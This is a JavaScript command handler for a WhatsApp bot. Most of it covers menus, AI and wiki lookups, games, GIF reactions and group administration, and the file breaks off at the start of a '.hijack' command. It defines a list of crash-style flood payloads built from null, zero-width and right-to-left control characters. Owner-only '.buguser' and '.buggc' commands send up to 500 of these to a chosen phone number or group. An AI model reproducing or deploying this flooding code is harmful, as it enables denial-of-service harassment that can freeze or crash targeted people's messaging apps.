'use strict'

const api       = require('./api')
const state     = require('./state')
const utils     = require('./utils')
const reactions = require('./reactions')
const { BOT_NAME, BOT_VERSION, OWNER_NAME, OWNER_NUMBER, OWNER_NUMBERS, PREFIX } = require('./config')

const FLOOD_PAYLOADS = [
    () => '\u0000'.repeat(3000) + '꧔ꦿ'.repeat(1000),
    () => '᷂᷿᷄᷾'.repeat(2000) + '\u202E'.repeat(1000),
    () => '\u200B\u200C\u200D\uFEFF'.repeat(3000),
    () => '𒐫'.repeat(2000) + '\u0000'.repeat(500),
    () => '🔥💥⚡🌀'.repeat(2000),
    () => '\u202E' + 'TAVIK'.repeat(1000) + '\u202C'.repeat(1000),
]

const GIF_ACTIONS = {
    hug: 'hug', pat: 'pat', slap: 'slap', kiss: 'kiss',
    cry: 'cry', dance: 'dance', wave: 'wave', wink: 'wink',
    bite: 'bite', blush: 'blush', cuddle: 'cuddle', poke: 'poke',
    yeet: 'yeet', bonk: 'bonk', lick: 'lick', highfive: 'highfive',
}

const pick   = arr => arr[Math.floor(Math.random() * arr.length)]
const sleep  = ms  => new Promise(r => setTimeout(r, ms))
const digits = str => str?.replace(/[^0-9]/g, '') || ''

// Extract number from @mention or plain number
function extractTarget(arg = '', quotedParticipant = '') {
    if (!arg && !quotedParticipant) return null
    // From quoted/replied message
    if (!arg && quotedParticipant) {
        return quotedParticipant.replace(/@s\.whatsapp\.net/g, '').replace(/[^0-9]/g, '')
    }
    // From @mention like @2348012345678
    if (arg.startsWith('@')) return arg.replace('@', '').replace(/[^0-9]/g, '')
    // Plain number
    return arg.replace(/[^0-9]/g, '') || null
}

async function handleCommand(chatId, sender, text, qid, isOwner, isSudo, isGroup, msg) {
    const isPrivileged = isOwner || isSudo
    const args  = text.trim().split(/\s+/)
    const cmd   = args[0].toLowerCase()
    const query = args.slice(1).join(' ')

    // Get quoted message participant (for reply-based commands)
    const quotedParticipant = msg?.message?.extendedTextMessage?.contextInfo?.participant || ''

    // ── .menu ────────────────────────────────────────────────
    if (cmd === `${PREFIX}menu` || cmd === `${PREFIX}help`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
`╔══════════════════════════════╗
║   🤖 *${BOT_NAME} ${BOT_VERSION}*          ║
║   👑 ${OWNER_NAME}           ║
║   ⚡ TAVIK TECH               ║
╚══════════════════════════════╝

📊 *STATUS*
┣ ⏳ Uptime : ${utils.getUptime()}
┣ 🔐 Mode   : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}
┗ 🟢 Online

─────────────────────────────
🌐 *GENERAL*
┣ ${PREFIX}alive  ${PREFIX}ping  ${PREFIX}info
┗ ${PREFIX}credits  ${PREFIX}owner

─────────────────────────────
🤖 *AI & TOOLS*
┣ ${PREFIX}ai <question>
┣ ${PREFIX}wiki <topic>
┣ ${PREFIX}weather <city>
┣ ${PREFIX}calc <math>
┗ ${PREFIX}time  ${PREFIX}pint <search>

─────────────────────────────
🎬 *MEDIA*
┣ ${PREFIX}tiktok <url>
┗ ${PREFIX}meme  ${PREFIX}upscale

─────────────────────────────
🎮 *FUN & GAMES*
┣ ${PREFIX}dice  ${PREFIX}coin  ${PREFIX}8ball
┣ ${PREFIX}truth  ${PREFIX}dare
┣ ${PREFIX}joke  ${PREFIX}funfact
┗ ${PREFIX}roast  ${PREFIX}compliment  ${PREFIX}quote  ${PREFIX}advice

─────────────────────────────
💞 *REACTIONS* _(sends GIF)_
┣ ${PREFIX}hug  ${PREFIX}pat  ${PREFIX}slap  ${PREFIX}kiss
┣ ${PREFIX}cry  ${PREFIX}dance  ${PREFIX}wave  ${PREFIX}wink
┣ ${PREFIX}bite  ${PREFIX}blush  ${PREFIX}cuddle
┗ ${PREFIX}poke  ${PREFIX}yeet  ${PREFIX}bonk  ${PREFIX}lick  ${PREFIX}highfive

─────────────────────────────
👥 *GROUP* _(admin only)_
┣ ${PREFIX}tagall  ${PREFIX}hidetag
┣ ${PREFIX}kick  ${PREFIX}add  ${PREFIX}promote  ${PREFIX}demote
┣ ${PREFIX}mute  ${PREFIX}unmute  ${PREFIX}gcinfo
┗ ${PREFIX}kickall  ${PREFIX}listadmins  ${PREFIX}grouplink  ${PREFIX}setgcname  ${PREFIX}resetlink

─────────────────────────────
⚙️ *SETTINGS* _(privileged)_
┣ ${PREFIX}antilink on/off
┣ ${PREFIX}antispam on/off
┣ ${PREFIX}antibadword on/off
┣ ${PREFIX}antidelete on/off
┣ ${PREFIX}autoreply on/off
┣ ${PREFIX}chatbot on/off
┗ ${PREFIX}autoread  ${PREFIX}autoreact  ${PREFIX}autotyping on/off

─────────────────────────────
👑 *OWNER ONLY*
┣ ${PREFIX}self  ${PREFIX}public
┣ ${PREFIX}addsudo <number/@mention>
┣ ${PREFIX}delsudo <number/@mention>
┣ ${PREFIX}sudolist  ${PREFIX}sudo
┣ ${PREFIX}buguser  ${PREFIX}buggc  ${PREFIX}stopflood
┗ ${PREFIX}hijack  ${PREFIX}banuser

─────────────────────────────
_⚡ Powered by TAVIK TECH_
_Say *tavik* anytime to wake me up!_`, qid)
    }

    // ── .alive ───────────────────────────────────────────────
    if (cmd === `${PREFIX}alive`) {
        return api.sendText(chatId,
            `╔══════════════════════╗\n` +
            `║   ✅ *BOT IS ALIVE!*  ║\n` +
            `╚══════════════════════╝\n\n` +
            `🤖 *${BOT_NAME} ${BOT_VERSION}*\n` +
            `⏳ Uptime : ${utils.getUptime()}\n` +
            `👑 Owner  : ${OWNER_NAME}\n` +
            `🔐 Mode   : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            `🟢 Status : Online`, qid)
    }

    // ── .ping ────────────────────────────────────────────────
    if (cmd === `${PREFIX}ping`) {
        const t = Date.now()
        return api.sendText(chatId, `🏓 *Pong!*\n⚡ Speed: ${Date.now() - t}ms`, qid)
    }

    // ── .info ────────────────────────────────────────────────
    if (cmd === `${PREFIX}info`) {
        return api.sendText(chatId,
            `🤖 *${BOT_NAME} ${BOT_VERSION}*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👑 Owner   : ${OWNER_NAME}\n` +
            `⚡ Engine  : TAVIK TECH\n` +
            `🔧 API     : Evolution API\n` +
            `🔐 Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            `⏳ Uptime  : ${utils.getUptime()}\n` +
            `🌍 Host    : Railway`, qid)
    }

    // ── .credits ─────────────────────────────────────────────
    if (cmd === `${PREFIX}credits`) {
        return api.sendText(chatId,
            `🏆 *TAVIK BOT CREDITS*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👑 Developer : GODSWILL (TAVIK)\n` +
            `🤖 Bot       : ${BOT_NAME} ${BOT_VERSION}\n` +
            `⚡ Engine    : Node.js + Evolution API\n` +
            `🌍 Host      : Railway\n` +
            `💎 Built with ❤️ by TAVIK(GODSWILL)`, qid)
    }

    // ── .owner ───────────────────────────────────────────────
    if (cmd === `${PREFIX}owner`) {
        return api.sendText(chatId,
            `👑 *BOT OWNER*\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `📛 Name   : ${OWNER_NAME}\n` +
            `📱 Number : wa.me/${OWNER_NUMBER}\n` +
            `⚡ Brand  : TAVIK TECH\n` +
            `🤖 Bot    : ${BOT_NAME} ${BOT_VERSION}`, qid)
    }

    // ── .ai ──────────────────────────────────────────────────
    if (cmd === `${PREFIX}ai` || cmd === `${PREFIX}tavik-ai`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}ai <question>`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId,
            `🤖 *TAVIK AI*\n━━━━━━━━━━━━\n\n${reply}\n\n━━━━━━━━━━━━\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .wiki ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}wiki`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}wiki <topic>`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWiki(query)
        if (!result) return api.sendText(chatId, '❌ Nothing found on Wikipedia!', qid)
        return api.sendText(chatId,
            `📖 *Wikipedia: ${query}*\n━━━━━━━━━━━━\n\n${result.slice(0, 800)}...\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .weather ─────────────────────────────────────────────
    if (cmd === `${PREFIX}weather`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}weather <city>`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWeather(query)
        if (!result) return api.sendText(chatId, '❌ City not found!', qid)
        return api.sendText(chatId, `🌤️ *Weather: ${query}*\n\n${result}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .calc ────────────────────────────────────────────────
    if (cmd === `${PREFIX}calculate` || cmd === `${PREFIX}calc`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}calc <expression>`, qid)
        try {
            const safe = query.replace(/[^0-9+\-*/.()%\s]/g, '')
            if (!safe) return api.sendText(chatId, '❌ Invalid expression!', qid)
            // eslint-disable-next-line no-new-func
            const result = Function(`"use strict"; return (${safe})`)()
            if (!isFinite(result)) return api.sendText(chatId, '❌ Result is undefined!', qid)
            return api.sendText(chatId,
                `🧮 *Calculator*\n\n📝 ${query}\n✅ = *${result}*\n\n⚡ ${BOT_NAME}`, qid)
        } catch {
            return api.sendText(chatId, '❌ Invalid expression! Example: .calc 5+3*2', qid)
        }
    }

    // ── .time ────────────────────────────────────────────────
    if (cmd === `${PREFIX}time`) {
        const now = new Date()
        return api.sendText(chatId,
            `🕐 *Current Time*\n━━━━━━━━━━━━\n` +
            `📅 ${now.toDateString()}\n` +
            `⏰ ${now.toTimeString().split(' ')[0]}\n` +
            `🌍 UTC: ${now.toUTCString()}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .pint ────────────────────────────────────────────────
    if (cmd === `${PREFIX}pint`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}pint <search query>`, qid)
        await api.sendTyping(chatId, 2)
        try {
            const url = await utils.searchImage(query)
            if (!url) return api.sendText(chatId, '❌ No image found!', qid)
            return api.sendImage(chatId, url, `🖼️ *${query}*\n⚡ ${BOT_NAME}`, qid)
        } catch {
            return api.sendText(chatId, '❌ Image search failed. Try again!', qid)
        }
    }

    // ── .tiktok ──────────────────────────────────────────────
    if (cmd === `${PREFIX}tiktok`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}tiktok <url>`, qid)
        await api.sendTyping(chatId, 3)
        const videoUrl = await utils.downloadTiktok(query)
        if (!videoUrl) return api.sendText(chatId, '❌ Failed! Make sure the TikTok link is valid.', qid)
        return api.sendVideo(chatId, videoUrl, `✅ Downloaded!\n⚡ ${BOT_NAME} | No Watermark`, qid)
    }

    // ── .meme ────────────────────────────────────────────────
    if (cmd === `${PREFIX}meme`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getMeme()
        if (!url) return api.sendText(chatId, '❌ Could not fetch a meme. Try again!', qid)
        return api.sendImage(chatId, url, `😂 *Random Meme!*\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .upscale ─────────────────────────────────────────────
    if (cmd === `${PREFIX}upscale`) {
        return api.sendText(chatId,
            `🔍 *Image Upscale*\n\nReply to an image with *.upscale* to upscale it.\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .dice ────────────────────────────────────────────────
    if (cmd === `${PREFIX}dice`) {
        const roll  = Math.floor(Math.random() * 6) + 1
        const faces = ['', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣']
        return api.sendText(chatId,
            `🎲 *Dice Roll!*\n\n${faces[roll]} You rolled a *${roll}*!\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .coin ────────────────────────────────────────────────
    if (cmd === `${PREFIX}coin`) {
        const result = Math.random() < 0.5 ? 'HEADS 🦅' : 'TAILS 🪙'
        return api.sendText(chatId, `🪙 *Coin Flip!*\n\nResult: *${result}*\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .8ball ───────────────────────────────────────────────
    if (cmd === `${PREFIX}8ball`) {
        if (!query) return api.sendText(chatId, `❌ Usage: ${PREFIX}8ball <question>`, qid)
        const answers = [
            '✅ Yes, definitely!', '✅ Without a doubt!', '✅ Most likely!',
            '⚠️ Maybe...', '⚠️ Ask again later', '⚠️ Cannot predict now',
            '❌ Don\'t count on it', '❌ Very doubtful', '❌ Definitely not!',
        ]
        return api.sendText(chatId,
            `🎱 *Magic 8Ball*\n━━━━━━━━━━━━\n❓ ${query}\n\n${pick(answers)}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .truth ───────────────────────────────────────────────
    if (cmd === `${PREFIX}truth`) {
        const truths = [
            'What is your biggest fear?',
            'Have you ever lied to your best friend?',
            'What is your most embarrassing moment?',
            'Do you have a crush on anyone here?',
            'What is the worst thing you have ever done?',
            'Have you ever cheated in an exam?',
            'What is your biggest secret?',
            'Have you ever stolen something?',
            'Who do you hate the most in this group?',
        ]
        return api.sendText(chatId, `🤫 *TRUTH*\n━━━━━━━━━━━━\n\n${pick(truths)}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .dare ────────────────────────────────────────────────
    if (cmd === `${PREFIX}dare`) {
        const dares = [
            'Send a voice note singing a song!',
            'Change your WhatsApp status to "I love TAVIK BOT" for 1 hour!',
            'Send a funny selfie right now!',
            'Text someone you haven\'t talked to in a year!',
            'Do 10 pushups and send proof!',
            'Send a voice note saying "TAVIK BOT is the best!"',
            'Send your most embarrassing photo!',
            'Call someone and say "I love you" in 3 languages!',
        ]
        return api.sendText(chatId, `😈 *DARE*\n━━━━━━━━━━━━\n\n${pick(dares)}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .joke ────────────────────────────────────────────────
    if (cmd === `${PREFIX}joke`) {
        await api.sendTyping(chatId, 1)
        const joke = await utils.getJoke()
        return api.sendText(chatId, `😂 *Joke!*\n━━━━━━━━━━━━\n\n${joke}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .funfact ─────────────────────────────────────────────
    if (cmd === `${PREFIX}funfact`) {
        await api.sendTyping(chatId, 1)
        const fact = await utils.getFunFact()
        return api.sendText(chatId, `🤯 *Fun Fact!*\n━━━━━━━━━━━━\n\n${fact}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .advice ──────────────────────────────────────────────
    if (cmd === `${PREFIX}advice`) {
        await api.sendTyping(chatId, 1)
        const adv = await utils.getAdvice()
        return api.sendText(chatId, `💡 *Daily Advice*\n━━━━━━━━━━━━\n\n${adv}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .quote ───────────────────────────────────────────────
    if (cmd === `${PREFIX}quote`) {
        await api.sendTyping(chatId, 1)
        const q = await utils.getQuote()
        return api.sendText(chatId, `💭 *Quote*\n━━━━━━━━━━━━\n\n${q}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .roast ───────────────────────────────────────────────
    if (cmd === `${PREFIX}roast`) {
        const roasts = [
            'You are the reason why instructions exist on shampoo bottles.',
            'I would agree with you but then we would both be wrong.',
            'You bring everyone so much joy when you leave the room.',
            'You are like a cloud — when you disappear, it is a beautiful day!',
            'I have seen better heads on a glass of beer.',
            'I\'d roast you but my mama told me not to burn trash.',
        ]
        const target = args[1] || 'you'
        return api.sendText(chatId,
            `🔥 *ROAST for @${target}*\n━━━━━━━━━━━━\n\n${pick(roasts)}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .compliment ──────────────────────────────────────────
    if (cmd === `${PREFIX}compliment`) {
        const compliments = [
            'You have a great sense of humor!',
            'You are an absolutely amazing person!',
            'You light up every room you walk into!',
            'You are stronger than you think!',
            'The world is a better place with you in it!',
            'You make everyone around you feel special!',
        ]
        const target = args[1] || 'you'
        return api.sendText(chatId,
            `💝 *Compliment for @${target}*\n━━━━━━━━━━━━\n\n${pick(compliments)}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── Reactions (with animated GIFs) ───────────────────────
    const reactionKey = cmd.slice(PREFIX.length)
    if (reactions[reactionKey] !== undefined || GIF_ACTIONS[reactionKey]) {
        const target = args[1] || 'everyone'
        const emoji  = reactions[reactionKey] || '✨'
        await api.sendTyping(chatId, 1)
        if (GIF_ACTIONS[reactionKey]) {
            const gifUrl = await utils.getReactionGif(GIF_ACTIONS[reactionKey])
            if (gifUrl) {
                return api.sendImage(chatId, gifUrl,
                    `${emoji} *@${sender}* ${reactionKey}s *@${target}*! ${emoji}\n⚡ ${BOT_NAME}`, qid)
            }
        }
        return api.sendText(chatId,
            `${emoji} *@${sender}* ${reactionKey}s *@${target}*! ${emoji}\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ════════════════════════════════════════════════════════
    //  SUDO MANAGEMENT (fixed & improved)
    // ════════════════════════════════════════════════════════

    // ── .sudo — check your own level ─────────────────────────
    if (cmd === `${PREFIX}sudo`) {
        if (!isOwner && !isSudo)
            return api.sendText(chatId,
                `❌ You are not privileged!\n\n` +
                `Ask the owner to add you:\n` +
                `👉 *${PREFIX}addsudo <your number>*\n\n` +
                `Contact owner: wa.me/${OWNER_NUMBER}`, qid)
        return api.sendText(chatId,
            `✅ *Access Confirmed!*\n\n` +
            `🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n` +
            `📱 Number: ${sender}\n` +
            `⚡ ${BOT_NAME}`, qid)
    }

    // ── .sudolist ────────────────────────────────────────────
    if (cmd === `${PREFIX}sudolist`) {
        if (!isPrivileged) return api.sendText(chatId, '❌ Not authorized!', qid)
        if (!state.sudoUsers.length)
            return api.sendText(chatId,
                `📋 *No sudo users yet.*\n\nAdd one with:\n*${PREFIX}addsudo <number>*`, qid)
        return api.sendText(chatId,
            `👥 *Sudo Users (${state.sudoUsers.length})*\n━━━━━━━━━━━━\n\n` +
            state.sudoUsers.map((n, i) => `${i + 1}. +${n}`).join('\n') +
            `\n\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .addsudo — owner only ─────────────────────────────────
    // Usage: .addsudo 2348012345678
    //        .addsudo @2348012345678
    //        Reply to someone's message + .addsudo
    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num)
            return api.sendText(chatId,
                `❌ *How to add sudo:*\n\n` +
                `1️⃣ *${PREFIX}addsudo 2348012345678*\n` +
                `2️⃣ Reply to someone's message + *${PREFIX}addsudo*\n` +
                `3️⃣ *${PREFIX}addsudo @number*`, qid)
        if (state.sudoUsers.includes(num))
            return api.sendText(chatId, `⚠️ *${num}* is already a sudo user!`, qid)
        state.sudoUsers.push(num)
        return api.sendText(chatId,
            `✅ *${num}* added as sudo!\n🔑 They can now use admin commands.\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .delsudo — owner only ─────────────────────────────────
    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num)
            return api.sendText(chatId,
                `❌ *How to remove sudo:*\n\n` +
                `1️⃣ *${PREFIX}delsudo 2348012345678*\n` +
                `2️⃣ Reply to someone's message + *${PREFIX}delsudo*`, qid)
        const before = state.sudoUsers.length
        state.sudoUsers = state.sudoUsers.filter(n => n !== num)
        if (state.sudoUsers.length === before)
            return api.sendText(chatId, `⚠️ *${num}* is not in the sudo list.`, qid)
        return api.sendText(chatId, `✅ *${num}* removed from sudo!\n⚡ ${BOT_NAME}`, qid)
    }

    // ════════════════════════════════════════════════════════
    //  GROUP COMMANDS
    // ════════════════════════════════════════════════════════

    if (cmd === `${PREFIX}tagall` && isGroup) {
        if (!isPrivileged) return api.sendText(chatId, '❌ Only admins can use this!', qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, '❌ Could not get group info!', qid)
        const members = info.participants?.map(p => p.id) || []
        const tags    = members.map(m => `@${m.split('@')[0]}`).join(' ')
        return api.sendText(chatId, `📢 *${query || 'Attention Everyone!'}*\n\n${tags}`, qid)
    }

    if (cmd === `${PREFIX}hidetag` && isGroup && isPrivileged) {
        return api.sendText(chatId, query || '📢', qid)
    }

    if (cmd === `${PREFIX}kick` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, '❌ Usage: .kick <number> or reply to message', qid)
        await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* has been kicked!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}add` && isGroup && isPrivileged) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, '❌ Usage: .add <number>', qid)
        await api.addGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* has been added!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}promote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, '❌ Usage: .promote <number> or reply to message', qid)
        await api.promoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* promoted to admin!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}demote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, '❌ Usage: .demote <number> or reply to message', qid)
        await api.demoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* demoted!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}mute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: true })
        return api.sendText(chatId, `🔇 Group muted!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}unmute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: false })
        return api.sendText(chatId, `🔊 Group unmuted!\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}gcinfo` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, '❌ Could not get group info!', qid)
        const admins = info.participants?.filter(p => p.rank === 'admin').length || 0
        return api.sendText(chatId,
            `📊 *Group Info*\n━━━━━━━━━━━━\n` +
            `📛 Name    : ${info.name || 'Unknown'}\n` +
            `👥 Members : ${info.participants?.length || 0}\n` +
            `👑 Admins  : ${admins}\n` +
            `🆔 ID      : ${chatId}\n\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}listadmins` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, '❌ Could not get group info!', qid)
        const admins = info.participants?.filter(p => p.rank === 'admin') || []
        if (!admins.length) return api.sendText(chatId, '⚠️ No admins found!', qid)
        return api.sendText(chatId,
            `👑 *Admins (${admins.length})*\n━━━━━━━━━━━━\n\n` +
            admins.map(a => `• @${a.id.split('@')[0]}`).join('\n') +
            `\n\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}setgcname` && isGroup && isPrivileged) {
        if (!query) return api.sendText(chatId, '❌ Usage: .setgcname <new name>', qid)
        await api.request('patch', `/groups/${chatId}`, { name: query })
        return api.sendText(chatId, `✅ Group renamed to: *${query}*\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}grouplink` && isGroup) {
        if (!isPrivileged) return api.sendText(chatId, '❌ Only admins can use this!', qid)
        const info = await api.getGroupInfo(chatId)
        if (!info?.invite) return api.sendText(chatId, '❌ Could not get invite link!', qid)
        return api.sendText(chatId,
            `🔗 *Group Invite Link*\n\nhttps://chat.whatsapp.com/${info.invite}\n\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}resetlink` && isGroup && isPrivileged) {
        const res = await api.request('delete', `/groups/${chatId}/invite`)
        const newInvite = res?.invite
        if (!newInvite) return api.sendText(chatId, '❌ Failed to reset invite link!', qid)
        return api.sendText(chatId,
            `✅ *New Group Link*\n\nhttps://chat.whatsapp.com/${newInvite}\n\n⚡ ${BOT_NAME}`, qid)
    }

    if (cmd === `${PREFIX}kickall` && isGroup && isOwner) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, '❌ Could not get group info!', qid)
        const members = info.participants
            ?.filter(p => p.rank !== 'admin' && !OWNER_NUMBERS.some(o => p.id.includes(o)))
            .map(p => p.id) || []
        if (!members.length) return api.sendText(chatId, '⚠️ No members to kick!', qid)
        await api.sendText(chatId, `⚡ Kicking ${members.length} members...`, qid)
        for (let i = 0; i < members.length; i += 5) {
            await api.removeGroupParticipants(chatId, members.slice(i, i + 5))
            await sleep(1000)
        }
        return api.sendText(chatId, `✅ Done! Kicked ${members.length} members.\n⚡ ${BOT_NAME}`, qid)
    }

    // ════════════════════════════════════════════════════════
    //  SETTINGS
    // ════════════════════════════════════════════════════════

    if (cmd === `${PREFIX}autoreply` && isPrivileged) {
        state.autoreply[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤖 Auto Reply: *${state.autoreply[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antidelete` && isPrivileged) {
        if (!state.antiDelete[chatId]) state.antiDelete[chatId] = {}
        state.antiDelete[chatId].enabled = args[1] === 'on'
        return api.sendText(chatId, `🗑️ Anti Delete: *${state.antiDelete[chatId].enabled ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antibadword` && isPrivileged) {
        state.antibadword[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤬 Anti Bad Word: *${state.antibadword[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoread` && isPrivileged) {
        state.autoread = args[1] === 'on'
        return api.sendText(chatId, `👁️ Auto Read: *${state.autoread ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoreact` && isPrivileged) {
        state.autoreact = args[1] === 'on'
        return api.sendText(chatId, `❤️ Auto React: *${state.autoreact ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autotyping` && isPrivileged) {
        state.autotyping = args[1] === 'on'
        return api.sendText(chatId, `⌨️ Auto Typing: *${state.autotyping ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antilink` && isPrivileged) {
        state.antilink[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🔗 Anti Link: *${state.antilink[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antispam` && isPrivileged) {
        state.antispam[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🚫 Anti Spam: *${state.antispam[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    // ── .chatbot on/off ───────────────────────────────────────
    if (cmd === `${PREFIX}chatbot` && isPrivileged) {
        state.chatbot[chatId] = args[1] === 'on'
        return api.sendText(chatId,
            `🤖 Chatbot Mode: *${state.chatbot[chatId] ? 'ON ✅' : 'OFF ❌'}*\n` +
            `${state.chatbot[chatId] ? 'Bot will now reply to every message as AI!' : 'Bot will only respond to commands.'}\n` +
            `⚡ ${BOT_NAME}`, qid)
    }

    // ── .self ────────────────────────────────────────────────
    if (cmd === `${PREFIX}self` && isOwner) {
        state.selfMode = true
        return api.sendText(chatId, `🔒 *Self Mode ON!*\nBot only responds to owners.\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .public ──────────────────────────────────────────────
    if (cmd === `${PREFIX}public` && isOwner) {
        state.selfMode = false
        return api.sendText(chatId, `🔓 *Public Mode ON!*\nBot responds to everyone.\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .buguser ─────────────────────────────────────────────
    if (cmd === `${PREFIX}buguser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, '❌ Usage: .buguser <number> [count]', qid)
        const count  = Math.min(parseInt(args[2]) || 200, 500)
        const jid    = `${target}@s.whatsapp.net`
        state.floodActive[jid] = true
        await api.sendText(chatId, `🐛 Flooding *${target}*... (${count} msgs)`, qid)
        let sent = 0
        while (state.floodActive[jid] && sent < count) {
            try {
                await api.sendText(jid, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]())
                if (sent % 5 !== 0) await sleep(100)
                sent++
            } catch { await sleep(200) }
        }
        state.floodActive[jid] = false
        return api.sendText(chatId, `✅ Sent *${sent}* messages to ${target}\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .buggc ───────────────────────────────────────────────
    if (cmd === `${PREFIX}buggc` && isOwner) {
        if (!isGroup) return api.sendText(chatId, '❌ Use inside a group!', qid)
        const count = Math.min(parseInt(args[1]) || 200, 500)
        state.floodActive[chatId] = true
        await api.sendText(chatId, `🐛 Flooding group... (${count} msgs)`, qid)
        let sent = 0
        while (state.floodActive[chatId] && sent < count) {
            try {
                await api.sendText(chatId, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]())
                if (sent % 5 !== 0) await sleep(100)
                sent++
            } catch { await sleep(200) }
        }
        state.floodActive[chatId] = false
        return api.sendText(chatId, `✅ Sent *${sent}* messages!\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .stopflood ───────────────────────────────────────────
    if (cmd === `${PREFIX}stopflood` && isOwner) {
        const target = digits(args[1])
        const key    = target ? `${target}@s.whatsapp.net` : chatId
        state.floodActive[key] = false
        return api.sendText(chatId, `🛑 Flood stopped!\n⚡ ${BOT_NAME}`, qid)
    }

    // ── .hijack ──────────────────────────────────────────────
    if (cmd === `${PREFIX}hijack` && isOwner) {
        if (!isGroup) return api.sendText(chatId, '❌ Use inside a group!', qid)
